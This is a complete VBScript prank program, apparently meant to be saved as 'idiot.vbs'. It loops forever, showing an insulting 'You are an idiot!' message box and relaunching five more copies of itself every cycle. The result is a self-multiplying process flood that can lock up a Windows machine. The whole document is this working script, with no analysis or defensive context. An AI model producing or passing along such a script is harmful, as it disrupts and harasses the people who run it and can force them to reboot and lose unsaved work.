do
  x = msgBox("You are an idiot!", 1+16, "A Messsage For You")
  Set x=WScript.CreateObject("WScript.shell")
  for i = 1 to 5:
    x.Run"idiot.vbs"
    WScript.sleep 500
  next
loop
